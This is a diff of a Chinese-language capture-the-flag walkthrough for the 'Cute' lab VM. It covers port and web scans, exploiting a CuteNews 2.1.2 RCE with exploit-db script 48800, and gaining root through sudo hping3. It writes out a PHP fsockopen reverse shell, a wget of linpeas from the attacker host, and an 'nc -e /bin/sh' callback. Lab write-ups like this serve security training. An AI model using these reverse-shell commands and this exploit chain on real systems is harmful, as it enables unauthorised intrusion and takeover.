@@ -1,13 +1,13 @@
 # Cute
-## 信息收集
-### 全端口扫描
+## 信息收集阶段
+### NMAP
+#### 全端口扫描
 ```
-┌──(aaron㉿aacai)-[~/Desktop/Cute-192.168.146.75]
-└─$ sudo nmap -p- 192.168.146.75                                        
+└─$ sudo nmap -p- 192.168.146.75                             
 [sudo] password for aaron: 
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 22:24 HKT
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-25 11:42 HKT
 Nmap scan report for 192.168.146.75
-Host is up (0.00087s latency).
+Host is up (0.00020s latency).
 Not shown: 65530 closed tcp ports (reset)
 PORT    STATE SERVICE
 22/tcp  open  ssh
@@ -17,15 +17,15 @@ PORT    STATE SERVICE
 995/tcp open  pop3s
 MAC Address: 00:0C:29:1B:B0:20 (VMware)
 
-Nmap done: 1 IP address (1 host up) scanned in 7.87 seconds
+Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
 
 ```
-### 指定端口扫描
+#### 指定端口扫描
 ```
-─$ sudo nmap -p22,80,88,110,995 -sV -A 192.168.146.75                              
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 22:26 HKT
+└─$ sudo nmap -p22,80,88,110,995 -sV -A 192.168.146.75
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-25 11:42 HKT
 Nmap scan report for 192.168.146.75
-Host is up (0.00024s latency).
+Host is up (0.00042s latency).
 
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
@@ -40,19 +40,19 @@ PORT    STATE SERVICE  VERSION
 |_http-title: 404 Not Found
 |_http-server-header: nginx/1.14.2
 110/tcp open  pop3     Courier pop3d
-|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) UIDL UTF8(USER) TOP LOGIN-DELAY(10) STLS PIPELINING USER
+|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) UTF8(USER) PIPELINING UIDL USER TOP LOGIN-DELAY(10) STLS
 | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
 | Subject Alternative Name: email:postmaster@example.com
 | Not valid before: 2020-09-17T16:28:06
 |_Not valid after:  2021-09-17T16:28:06
 |_ssl-date: TLS randomness does not represent time
 995/tcp open  ssl/pop3 Courier pop3d
-|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) UTF8(USER) TOP PIPELINING UIDL LOGIN-DELAY(10) USER
-|_ssl-date: TLS randomness does not represent time
+|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) PIPELINING UTF8(USER) USER TOP LOGIN-DELAY(10) UIDL
 | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
 | Subject Alternative Name: email:postmaster@example.com
 | Not valid before: 2020-09-17T16:28:06
 |_Not valid after:  2021-09-17T16:28:06
+|_ssl-date: TLS randomness does not represent time
 MAC Address: 00:0C:29:1B:B0:20 (VMware)
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Device type: general purpose
@@ -64,10 +64,238 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE
 HOP RTT     ADDRESS
-1   0.24 ms 192.168.146.75
+1   0.42 ms 192.168.146.75
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
+Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
+```
+### Web信息收集
+#### Nikto
+```
+└─$ nikto -h 192.168.146.75      
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.146.75
++ Target Hostname:    192.168.146.75
++ Target Port:        80
++ Start Time:         2022-07-25 11:44:49 (GMT8)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie CUTENEWS_SESSION created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Multiple index files found: /index.php, /index.html
++ Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5af83f7e950ce, mtime: gzip
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7916 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2022-07-25 11:45:40 (GMT8) (51 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+发现存在index.php
+![Img](../FILES/Cute.md/img-20220725114624.png)
+能注册用户
+进入注册界面
+![Img](../FILES/Cute.md/img-20220725114706.png)
+发现验证码找不出来
+打开源码查看一下本页面
+![Img](../FILES/Cute.md/img-20220725114756.png)
+发现有个captcha.php
+![Img](../FILES/Cute.md/img-20220725114807.png)
+打开之后发现验证码
+注册成功后登录
+![Img](../FILES/Cute.md/img-20220725114835.png)
+发现底部的版本号为2.1.2, google搜一下
+![Img](../FILES/Cute.md/img-20220725114909.png)
+发现本版本有RCE
+#### 漏洞利用
+```
+└─$ searchsploit cutenews 2.1.2
+---------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                          |  Path
+---------------------------------------------------------------------------------------- ---------------------------------
+CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                            | php/remote/46698.rb
+CuteNews 2.1.2 - Arbitrary File Deletion                                                | php/webapps/48447.txt
+CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                    | php/webapps/48458.txt
+CuteNews 2.1.2 - Remote Code Execution                                                  | php/webapps/48800.py
+---------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+在exploit发现有现成的python脚本
+下载下来使用
+```
+└─$ searchsploit -m php/webapps/48800.py
+  Exploit: CuteNews 2.1.2 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/48800
+     Path: /usr/share/exploitdb/exploits/php/webapps/48800.py
+File Type: Python script, ASCII text executable
+
+Copied to: /home/aaron/Desktop/Cute-192.168.146.75/48800.py
+
+
+                                                                                                                          
+┌──(aaron㉿aacai)-[~/Desktop/Cute-192.168.146.75]
+└─$ ls
+48800.py  LANs.py
+└─$ python3 48800.py
+
+
+
+           _____     __      _  __                     ___   ___  ___
+          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
+         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
+         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
+                                ___  _________
+                               / _ \/ ___/ __/
+                              / , _/ /__/ _/
+                             /_/|_|\___/___/
+
+
+
+
+[->] Usage python3 expoit.py
+
+Enter the URL> http://192.168.146.75/
+================================================================
+Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
+================================================================
+[-] No hashes were found skipping!!!
+================================================================
+
+=============================
+Registering a users
+=============================
+                                                                                                                          
+┌──(aaron㉿aacai)-[~/Desktop/Cute-192.168.146.75]
+└─$ 
 
 ```
+但是发现不存在此用户, 查看一下漏洞利用代码
+![Img](../FILES/Cute.md/img-20220725115151.png)
+发现我们没有这个目录, 把EXP里面所有的目录去掉试试
+重新执行
+![Img](../FILES/Cute.md/img-20220725115318.png)
+发现可以执行
+```
+command > whoami
+www-data
+
+command > ls
+avatar_55Y2xTic4I_55Y2xTic4I.php
+avatar_ET3TpbEJQk_ET3TpbEJQk.php
+avatar_IgJLU8OSMX_IgJLU8OSMX.php
+avatar_PoKxESSE4D_PoKxESSE4D.php
+avatar_RvFcklLkzE_RvFcklLkzE.php
+avatar_VvgU5CZIce_VvgU5CZIce.php
+avatar_cruDW9A0zh_cruDW9A0zh.php
+avatar_rwRemM6TLd_message2.jpg
+index.html
+```
+执行反弹shell
+```
+php -r '$sock=fsockopen("192.168.146.50",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+```
+
+![Img](../FILES/Cute.md/img-20220725115522.png)
+拿到shell
+### 提权
+#### 使用linpeas进行信息收集
+```
+www-data@cute:/tmp$ wget http://192.168.146.50/linpeas.sh
+wget http://192.168.146.50/linpeas.sh
+--2022-07-23 14:30:48--  http://192.168.146.50/linpeas.sh
+Connecting to 192.168.146.50:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 777005 (759K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh          100%[===================>] 758.79K  --.-KB/s    in 0.02s   
+
+2022-07-23 14:30:48 (43.2 MB/s) - 'linpeas.sh' saved [777005/777005]
+
+```
+##### 获取能够使用的漏洞信息
+```
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+Matching Defaults entries for www-data on cute:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on cute:
+    (root) NOPASSWD: /usr/sbin/hping3 --icmp
+    (ALL) NOPASSWD: ALL
+
+```
+##### 发现可以直接使用hping3执行sudo
+```
+www-data@cute:/tmp$ sudo /usr/sbin/hping3   
+sudo /usr/sbin/hping3
+hping3> id
+id
+uid=0(root) gid=0(root) groups=0(root)
+hping3> whoami
+whoami
+root
+hping3> pwd
+pwd
+/tmp
+hping3> 
+```
+##### 使用nc反弹shell
+```
+hping3> nc -e /bin/sh 192.168.146.50 4445
+nc -e /bin/sh 192.168.146.50 4445
+```
+##### 最终getshell
+```
+┌──(aaron㉿aacai)-[~/Desktop/Cute-192.168.146.75]
+└─$ nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [192.168.146.50] from (UNKNOWN) [192.168.146.75] 57576
+id
+uid=0(root) gid=0(root) groups=0(root)
+/usr/bin/script -qc /bin/bash /dev/null
+root@cute:/tmp# cd /root
+cd /root
+root@cute:~# ls
+ls
+localweb  root.txt
+root@cute:~# cat root.txtg
+cat root.txtg
+cat: root.txtg: No such file or directory
+root@cute:~# cat root.txt
+cat root.txt
+0b18032c2d06d9e738ede9bc24795ff2
+root@cute:~# ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:0c:29:1b:b0:20 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.146.75/24 brd 192.168.146.255 scope global dynamic ens33
+       valid_lft 70362sec preferred_lft 70362sec
+    inet6 fe80::20c:29ff:fe1b:b020/64 scope link 
+       valid_lft forever preferred_lft forever
+root@cute:~# whoami
+whoami
+root
+root@cute:~# 
+```
+![Img](../FILES/Cute.md/img-20220725120352.png)
+
+
 
